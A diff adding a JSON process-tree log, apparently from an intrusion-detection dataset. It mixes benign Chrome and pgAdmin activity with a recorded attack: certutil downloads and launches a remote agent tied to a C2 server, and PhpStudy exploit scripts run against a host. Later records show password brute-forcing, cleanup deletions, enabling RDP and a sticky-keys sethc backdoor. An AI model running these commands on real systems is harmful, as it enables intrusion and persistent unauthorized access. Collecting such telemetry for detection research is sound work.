@@ -1,0 +1,3706 @@
+{
+  "scenario": "WS12",
+  "nodes": {
+    "3820_2342.5097": {
+      "pid": "3820",
+      "parent_id": "2428",
+      "parent_key": null,
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" ",
+      "msec": "2342.5097",
+      "repeat_count": 9
+    },
+    "7100_2349.3797": {
+      "pid": "7100",
+      "parent_id": "3820",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=crashpad-handler \"--user-data-dir=C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler \"--database=C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Crashpad\" \"--metrics-dir=C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\" --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=plat=Win64 --annotation=prod=Chrome --annotation=ver=",
+      "msec": "2349.3797",
+      "repeat_count": 9
+    },
+    "1524_29653.6192": {
+      "pid": "1524",
+      "parent_id": "2428",
+      "parent_key": null,
+      "image": "notepad.exe",
+      "command_line": "\"C:\\Windows\\system32\\NOTEPAD.EXE\" D:\\log.txt",
+      "msec": "29653.6192",
+      "repeat_count": 3
+    },
+    "6728_2480.3764": {
+      "pid": "6728",
+      "parent_id": "3820",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=gpu-process --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=1252 --field-trial-handle=1228,i,15620778174164690009,1080067515344668206,131072 /prefetch:2",
+      "msec": "2480.3764",
+      "repeat_count": 9
+    },
+    "3436_2485.5104": {
+      "pid": "3436",
+      "parent_id": "3820",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-GB --service-sandbox-type=none --mojo-platform-channel-handle=1492 --field-trial-handle=1228,i,15620778174164690009,1080067515344668206,131072 /prefetch:8",
+      "msec": "2485.5104",
+      "repeat_count": 9
+    },
+    "1196_2535.0658": {
+      "pid": "1196",
+      "parent_id": "3820",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-GB --service-sandbox-type=utility --mojo-platform-channel-handle=1580 --field-trial-handle=1228,i,15620778174164690009,1080067515344668206,131072 /prefetch:8",
+      "msec": "2535.0658",
+      "repeat_count": 9
+    },
+    "4776_2605.9108": {
+      "pid": "4776",
+      "parent_id": "3820",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=6 --launch-time-ticks=1217843364318 --mojo-platform-channel-handle=2264 --field-trial-handle=1228,i,15620778174164690009,1080067515344668206,131072 /prefetch:1",
+      "msec": "2605.9108",
+      "repeat_count": 8
+    },
+    "6624_2627.4475": {
+      "pid": "6624",
+      "parent_id": "3820",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --instant-process --display-capture-permissions-policy-allowed --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --launch-time-ticks=1217843381500 --mojo-platform-channel-handle=2352 --field-trial-handle=1228,i,15620778174164690009,1080067515344668206,131072 /prefetch:1",
+      "msec": "2627.4475",
+      "repeat_count": 8
+    },
+    "5640_2740.3249": {
+      "pid": "5640",
+      "parent_id": "524",
+      "parent_key": null,
+      "image": "RuntimeBroker.exe",
+      "command_line": "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding",
+      "msec": "2740.3249",
+      "repeat_count": 6
+    },
+    "4560_2918.4273": {
+      "pid": "4560",
+      "parent_id": "3820",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=7 --launch-time-ticks=1217843676686 --mojo-platform-channel-handle=3628 --field-trial-handle=1228,i,15620778174164690009,1080067515344668206,131072 /prefetch:1",
+      "msec": "2918.4273",
+      "repeat_count": 8
+    },
+    "856_3431.5648": {
+      "pid": "856",
+      "parent_id": "3820",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --utility-sub-type=audio.mojom.AudioService --lang=en-GB --service-sandbox-type=audio --mojo-platform-channel-handle=2560 --field-trial-handle=1228,i,15620778174164690009,1080067515344668206,131072 /prefetch:8",
+      "msec": "3431.5648",
+      "repeat_count": 9
+    },
+    "4624_97505.8405": {
+      "pid": "4624",
+      "parent_id": "524",
+      "parent_key": null,
+      "image": "TSTheme.exe",
+      "command_line": "C:\\Windows\\system32\\TSTheme.exe -Embedding",
+      "msec": "97505.8405",
+      "repeat_count": 8
+    },
+    "4696_107348.5240": {
+      "pid": "4696",
+      "parent_id": "4452",
+      "parent_key": null,
+      "image": "cmd.exe",
+      "command_line": "cmd.exe /c \"ipconfig\"",
+      "msec": "107348.5240",
+      "repeat_count": 1
+    },
+    "3644_27767.2813": {
+      "pid": "3644",
+      "parent_id": "3868",
+      "parent_key": "3868_27764.9466",
+      "image": "conhost.exe",
+      "command_line": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff",
+      "msec": "27767.2813",
+      "repeat_count": 33
+    },
+    "3432_107356.8781": {
+      "pid": "3432",
+      "parent_id": "4696",
+      "parent_key": "4696_107348.5240",
+      "image": "ipconfig.exe",
+      "command_line": "ipconfig",
+      "msec": "107356.8781",
+      "repeat_count": 2
+    },
+    "2124_117810.2326": {
+      "pid": "2124",
+      "parent_id": "4452",
+      "parent_key": null,
+      "image": "cmd.exe",
+      "command_line": "cmd.exe /c \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"",
+      "msec": "117810.2326",
+      "repeat_count": 1
+    },
+    "3016_117818.5499": {
+      "pid": "3016",
+      "parent_id": "2124",
+      "parent_key": "2124_117810.2326",
+      "image": "whoami.exe",
+      "command_line": "whoami",
+      "msec": "117818.5499",
+      "repeat_count": 1
+    },
+    "2708_117826.7859": {
+      "pid": "2708",
+      "parent_id": "2124",
+      "parent_key": "2124_117810.2326",
+      "image": "ARP.EXE",
+      "command_line": "arp  -a",
+      "msec": "117826.7859",
+      "repeat_count": 1
+    },
+    "4964_117845.9773": {
+      "pid": "4964",
+      "parent_id": "2124",
+      "parent_key": "2124_117810.2326",
+      "image": "PING.EXE",
+      "command_line": "ping  www.baidu.com -c 1",
+      "msec": "117845.9773",
+      "repeat_count": 1
+    },
+    "1996_127854.1959": {
+      "pid": "1996",
+      "parent_id": "4452",
+      "parent_key": null,
+      "image": "cmd.exe",
+      "command_line": "cmd.exe /c \"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"",
+      "msec": "127854.1959",
+      "repeat_count": 1
+    },
+    "4328_127862.6081": {
+      "pid": "4328",
+      "parent_id": "1996",
+      "parent_key": "1996_127854.1959",
+      "image": "taskkill.exe",
+      "command_line": "taskkill  /f /im agent.exe",
+      "msec": "127862.6081",
+      "repeat_count": 1
+    },
+    "4248_127880.3239": {
+      "pid": "4248",
+      "parent_id": "524",
+      "parent_key": null,
+      "image": "WmiPrvSE.exe",
+      "command_line": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+      "msec": "127880.3239",
+      "repeat_count": 125
+    },
+    "3268_127919.3304": {
+      "pid": "3268",
+      "parent_id": "1996",
+      "parent_key": "1996_127854.1959",
+      "image": "certutil.exe",
+      "command_line": "certutil  -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+      "msec": "127919.3304",
+      "repeat_count": 1
+    },
+    "4180_19356.0217": {
+      "pid": "4180",
+      "parent_id": "2428",
+      "parent_key": null,
+      "image": "notepad.exe",
+      "command_line": "\"C:\\Windows\\system32\\NOTEPAD.EXE\" D:\\benign2.txt",
+      "msec": "19356.0217",
+      "repeat_count": 10
+    },
+    "2120_22300.3428": {
+      "pid": "2120",
+      "parent_id": "1228",
+      "parent_key": null,
+      "image": "postgres.exe",
+      "command_line": "\"C:/Program Files/PostgreSQL/12/bin/postgres.exe\" \"--forkavworker\" \"5200\"",
+      "msec": "22300.3428",
+      "repeat_count": 2412
+    },
+    "3148_27254.5916": {
+      "pid": "3148",
+      "parent_id": "2428",
+      "parent_key": null,
+      "image": "pgAdmin4.exe",
+      "command_line": "\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\\pgAdmin4.exe\" ",
+      "msec": "27254.5916",
+      "repeat_count": 3
+    },
+    "7036_27307.6289": {
+      "pid": "7036",
+      "parent_id": "3148",
+      "parent_key": "3148_27254.5916",
+      "image": "pgAdmin4.exe",
+      "command_line": "\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\\pgAdmin4.exe\" --type=crashpad-handler \"--user-data-dir=C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data\" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler \"--database=C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data\\Crashpad\" \"--metrics-dir=C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data\" --annotation=plat=Win64 --annotation=prod=pgadmin4 --annotation=ver= --initial-client-data=0x184,0x188,0x18c,0x160,0x190,0x7ffb80d370f8,0x7ffb8",
+      "msec": "27307.6289",
+      "repeat_count": 2
+    },
+    "1144_27339.7125": {
+      "pid": "1144",
+      "parent_id": "3148",
+      "parent_key": "3148_27254.5916",
+      "image": "pgAdmin4.exe",
+      "command_line": "\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\\pgAdmin4.exe\" --type=gpu-process --field-trial-handle=1216,8632104137463735512,6687507368737191602,131072 --no-sandbox --user-data-dir=\"C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data\" --nwapp-path=\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\" --start-stack-profiler --gpu-preferences=UAAAAAAAAADgAAAQAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgAAAAAAAAAeAAAAAAAAAAoAAAABAAAACAAAAAAAAAAKAAAAAAAAAAwAAAAAAAAADgAAAAAAAAAEAAAAAAAAAAA",
+      "msec": "27339.7125",
+      "repeat_count": 2
+    },
+    "6508_27340.3402": {
+      "pid": "6508",
+      "parent_id": "3148",
+      "parent_key": "3148_27254.5916",
+      "image": "pgAdmin4.exe",
+      "command_line": "\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\\pgAdmin4.exe\" --type=utility --utility-sub-type=network.mojom.NetworkService --field-trial-handle=1216,8632104137463735512,6687507368737191602,131072 --lang=zh-CN --service-sandbox-type=none --no-sandbox --user-data-dir=\"C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data\" --nwapp-path=\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\" --start-stack-profiler --mojo-platform-channel-handle=1428 /prefetch:8",
+      "msec": "27340.3402",
+      "repeat_count": 3
+    },
+    "6844_27353.0043": {
+      "pid": "6844",
+      "parent_id": "3148",
+      "parent_key": "3148_27254.5916",
+      "image": "pgAdmin4.exe",
+      "command_line": "\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\\pgAdmin4.exe\" --type=utility --utility-sub-type=storage.mojom.StorageService --field-trial-handle=1216,8632104137463735512,6687507368737191602,131072 --lang=zh-CN --service-sandbox-type=utility --no-sandbox --user-data-dir=\"C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data\" --nwapp-path=\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\" --mojo-platform-channel-handle=1672 /prefetch:8",
+      "msec": "27353.0043",
+      "repeat_count": 3
+    },
+    "2024_27453.8897": {
+      "pid": "2024",
+      "parent_id": "3148",
+      "parent_key": "3148_27254.5916",
+      "image": "pgAdmin4.exe",
+      "command_line": "\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\\pgAdmin4.exe\" --type=renderer --no-sandbox --file-url-path-alias=\"/gen=C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\\gen\" --no-zygote --field-trial-handle=1216,8632104137463735512,6687507368737191602,131072 --lang=zh-CN --user-data-dir=\"C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data\" --nwapp-path=\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\" --nwjs --extension-process --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --mojo-platform-",
+      "msec": "27453.8897",
+      "repeat_count": 2
+    },
+    "3868_27764.9466": {
+      "pid": "3868",
+      "parent_id": "2024",
+      "parent_key": "2024_27453.8897",
+      "image": "python.exe",
+      "command_line": "\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\python\\python.exe\" -s \"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\web\\pgAdmin4.py\"",
+      "msec": "27764.9466",
+      "repeat_count": 3
+    },
+    "7008_27892.5037": {
+      "pid": "7008",
+      "parent_id": "3868",
+      "parent_key": "3868_27764.9466",
+      "image": "cmd.exe",
+      "command_line": "C:\\Windows\\system32\\cmd.exe /c \"ver\"",
+      "msec": "27892.5037",
+      "repeat_count": 3
+    },
+    "6916_30815.4093": {
+      "pid": "6916",
+      "parent_id": "3868",
+      "parent_key": "3868_27764.9466",
+      "image": "cmd.exe",
+      "command_line": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\runtime\\pg_dump.exe\" --version\"",
+      "msec": "30815.4093",
+      "repeat_count": 2
+    },
+    "3200_30819.1981": {
+      "pid": "3200",
+      "parent_id": "3868",
+      "parent_key": "3868_27764.9466",
+      "image": "cmd.exe",
+      "command_line": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\runtime\\pg_dumpall.exe\" --version\"",
+      "msec": "30819.1981",
+      "repeat_count": 3
+    },
+    "924_30822.8094": {
+      "pid": "924",
+      "parent_id": "3868",
+      "parent_key": "3868_27764.9466",
+      "image": "cmd.exe",
+      "command_line": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\runtime\\pg_restore.exe\" --version\"",
+      "msec": "30822.8094",
+      "repeat_count": 3
+    },
+    "6808_30826.3350": {
+      "pid": "6808",
+      "parent_id": "3868",
+      "parent_key": "3868_27764.9466",
+      "image": "cmd.exe",
+      "command_line": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\runtime\\psql.exe\" --version\"",
+      "msec": "30826.3350",
+      "repeat_count": 3
+    },
+    "5920_38229.6098": {
+      "pid": "5920",
+      "parent_id": "1228",
+      "parent_key": null,
+      "image": "postgres.exe",
+      "command_line": "\"C:/Program Files/PostgreSQL/12/bin/postgres.exe\" \"--forkbackend\" \"5176\"",
+      "msec": "38229.6098",
+      "repeat_count": 11
+    },
+    "6948_57340.4382": {
+      "pid": "6948",
+      "parent_id": "3148",
+      "parent_key": "3148_27254.5916",
+      "image": "pgAdmin4.exe",
+      "command_line": "\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\\pgAdmin4.exe\" --type=utility --utility-sub-type=chrome.mojom.UtilWin --field-trial-handle=1216,8632104137463735512,6687507368737191602,131072 --lang=zh-CN --service-sandbox-type=none --no-sandbox --user-data-dir=\"C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data\" --nwapp-path=\"C:\\Program Files\\PostgreSQL\\12\\pgAdmin 4\\bin\" --mojo-platform-channel-handle=2852 /prefetch:8",
+      "msec": "57340.4382",
+      "repeat_count": 2
+    },
+    "4360_143891.0271": {
+      "pid": "4360",
+      "parent_id": "1996",
+      "parent_key": "1996_127854.1959",
+      "image": "cmd.exe",
+      "command_line": "cmd  /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+      "msec": "143891.0271",
+      "repeat_count": 1
+    },
+    "4128_143906.2601": {
+      "pid": "4128",
+      "parent_id": "4360",
+      "parent_key": "4360_143891.0271",
+      "image": "agent.exe",
+      "command_line": "C:\\Users\\Public\\agent.exe  -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+      "msec": "143906.2601",
+      "repeat_count": 1
+    },
+    "4440_153428.2392": {
+      "pid": "4440",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c echo start:78cfa46d-d648-44ac-9ed8-ee7469cb82c2",
+      "msec": "153428.2392",
+      "repeat_count": 1
+    },
+    "3240_153507.9070": {
+      "pid": "3240",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c python PhpStudyPoc.py http://121.36.30.176/",
+      "msec": "153507.9070",
+      "repeat_count": 1
+    },
+    "3360_153517.6138": {
+      "pid": "3360",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c del /f /q PhpStudyPoc.py",
+      "msec": "153517.6138",
+      "repeat_count": 1
+    },
+    "3996_153526.4106": {
+      "pid": "3996",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c echo end:78cfa46d-d648-44ac-9ed8-ee7469cb82c2",
+      "msec": "153526.4106",
+      "repeat_count": 1
+    },
+    "4808_163598.4281": {
+      "pid": "4808",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc\"",
+      "msec": "163598.4281",
+      "repeat_count": 1
+    },
+    "7100_124994.8322": {
+      "pid": "7100",
+      "parent_id": "1688",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=9 --launch-time-ticks=1217965753249 --mojo-platform-channel-handle=4316 --field-trial-handle=1184,i,15979699124547685593,75889689086335812,131072 /prefetch:1",
+      "msec": "124994.8322",
+      "repeat_count": 4
+    },
+    "4812_131164.1316": {
+      "pid": "4812",
+      "parent_id": "1688",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=10 --launch-time-ticks=1217971922428 --mojo-platform-channel-handle=2416 --field-trial-handle=1184,i,15979699124547685593,75889689086335812,131072 /prefetch:1",
+      "msec": "131164.1316",
+      "repeat_count": 4
+    },
+    "5328_147218.3547": {
+      "pid": "5328",
+      "parent_id": "1688",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=11 --launch-time-ticks=1217987976715 --mojo-platform-channel-handle=4660 --field-trial-handle=1184,i,15979699124547685593,75889689086335812,131072 /prefetch:1",
+      "msec": "147218.3547",
+      "repeat_count": 3
+    },
+    "3284_163932.8018": {
+      "pid": "3284",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \\\"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\\\"'\"",
+      "msec": "163932.8018",
+      "repeat_count": 1
+    },
+    "5404_185347.7594": {
+      "pid": "5404",
+      "parent_id": "2428",
+      "parent_key": null,
+      "image": "notepad.exe",
+      "command_line": "\"C:\\Windows\\system32\\NOTEPAD.EXE\" D:\\phpStudy\\Apache\\conf\\httpd.conf",
+      "msec": "185347.7594",
+      "repeat_count": 3
+    },
+    "4200_164063.5746": {
+      "pid": "4200",
+      "parent_id": "3284",
+      "parent_key": "3284_163932.8018",
+      "image": "cmd.exe",
+      "command_line": "\"C:\\Windows\\system32\\cmd.exe\"  /c \"python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"\"",
+      "msec": "164063.5746",
+      "repeat_count": 1
+    },
+    "4940_164081.9619": {
+      "pid": "4940",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c del /f /q PhpStudyExp2.py ",
+      "msec": "164081.9619",
+      "repeat_count": 2
+    },
+    "4080_164091.4158": {
+      "pid": "4080",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"echo end:f98e6367-e38b-4e53-ba83-c58ede5c85fc\"",
+      "msec": "164091.4158",
+      "repeat_count": 1
+    },
+    "4692_173679.7981": {
+      "pid": "4692",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:dbb2f234-101f-4f44-bb97-72263635f506\"",
+      "msec": "173679.7981",
+      "repeat_count": 1
+    },
+    "6476_247282.6242": {
+      "pid": "6476",
+      "parent_id": "2428",
+      "parent_key": null,
+      "image": "notepad.exe",
+      "command_line": "\"C:\\Windows\\system32\\NOTEPAD.EXE\" D:\\phpStudy\\Apache\\conf\\extra\\httpd-autoindex.conf",
+      "msec": "247282.6242",
+      "repeat_count": 1
+    },
+    "4616_255066.0107": {
+      "pid": "4616",
+      "parent_id": "2428",
+      "parent_key": null,
+      "image": "notepad.exe",
+      "command_line": "\"C:\\Windows\\system32\\NOTEPAD.EXE\" D:\\phpStudy\\Apache\\conf\\extra\\httpd-vhosts.conf",
+      "msec": "255066.0107",
+      "repeat_count": 2
+    },
+    "4804_268616.0006": {
+      "pid": "4804",
+      "parent_id": "524",
+      "parent_key": null,
+      "image": "WmiPrvSE.exe",
+      "command_line": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding",
+      "msec": "268616.0006",
+      "repeat_count": 121
+    },
+    "3740_173953.4470": {
+      "pid": "3740",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \\\"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\\\"'\"",
+      "msec": "173953.4470",
+      "repeat_count": 1
+    },
+    "4572_174081.8782": {
+      "pid": "4572",
+      "parent_id": "3740",
+      "parent_key": "3740_173953.4470",
+      "image": "cmd.exe",
+      "command_line": "\"C:\\Windows\\system32\\cmd.exe\"  /c \"python PhpStudyExp2.py http://121.36.30.176/ \"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"\"",
+      "msec": "174081.8782",
+      "repeat_count": 1
+    },
+    "3076_174109.0190": {
+      "pid": "3076",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"echo end:dbb2f234-101f-4f44-bb97-72263635f506\"",
+      "msec": "174109.0190",
+      "repeat_count": 1
+    },
+    "4632_183839.1698": {
+      "pid": "4632",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c echo start:5a860809-a5ba-4924-8c54-065a8650bdc9",
+      "msec": "183839.1698",
+      "repeat_count": 1
+    },
+    "4320_184724.1529": {
+      "pid": "4320",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c WinBrute.exe administrator_pass.txt administrator",
+      "msec": "184724.1529",
+      "repeat_count": 1
+    },
+    "3524_184729.6767": {
+      "pid": "3524",
+      "parent_id": "4320",
+      "parent_key": "4320_184724.1529",
+      "image": "WinBrute.exe",
+      "command_line": "WinBrute.exe  administrator_pass.txt administrator",
+      "msec": "184729.6767",
+      "repeat_count": 1
+    },
+    "4900_185749.1999": {
+      "pid": "4900",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c del /f /q WinBrute.exe && del /f /q administrator_pass.txt",
+      "msec": "185749.1999",
+      "repeat_count": 1
+    },
+    "3204_185757.8735": {
+      "pid": "3204",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "cmd.exe",
+      "command_line": "/c echo end:5a860809-a5ba-4924-8c54-065a8650bdc9",
+      "msec": "185757.8735",
+      "repeat_count": 1
+    },
+    "5032_194118.6657": {
+      "pid": "5032",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:b7f92752-df34-4b08-9e98-45a3004b94ff\"",
+      "msec": "194118.6657",
+      "repeat_count": 1
+    },
+    "3900_194323.3531": {
+      "pid": "3900",
+      "parent_id": "4128",
+      "parent_key": "4128_143906.2601",
+      "image": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \\\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=\\\"Remote Desktop\\\" dir=in action=allow protocol=TCP localport=3389;reg query \\\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\";REG ADD \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\\" /v Debugger /t REG_SZ /d \\\"C:\\windows\\system32\\cmd.exe\\",
+      "msec": "194323.3531",
+      "repeat_count": 1
+    },
+    "520_194457.4976": {
+      "pid": "520",
+      "parent_id": "3900",
+      "parent_key": "3900_194323.3531",
+      "image": "reg.exe",
+      "command_line": "\"C:\\Windows\\system32\\reg.exe\"  add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+      "msec": "194457.4976",
+      "repeat_count": 1
+    },
+    "3276_194462.2506": {
+      "pid": "3276",
+      "parent_id": "3900",
+      "parent_key": "3900_194323.3531",
+      "image": "netsh.exe",
+      "command_line": "\"C:\\Windows\\system32\\netsh.exe\"  advfirewall firewall add rule \"name=Remote Desktop\" dir=in action=allow protocol=TCP localport=3389",
+      "msec": "194462.2506",
+      "repeat_count": 1
+    },
+    "4256_194491.4080": {
+      "pid": "4256",
+      "parent_id": "3900",
+      "parent_key": "3900_194323.3531",
+      "image": "reg.exe",
+      "command_line": "\"C:\\Windows\\system32\\reg.exe\"  query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"",
+      "msec": "194491.4080",
+      "repeat_count": 1
+    },
+    "4520_194500.4192": {
+      "pid": "4520",
+      "parent_id": "3900",
+      "parent_key": "3900_194323.3531",
+      "image": "reg.exe",
+      "command_line": "\"C:\\Windows\\system32\\reg.exe\"  ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+      "msec": "194500.4192",
+      "repeat_count": 1
+    },
+    "3332_194504.9759": {
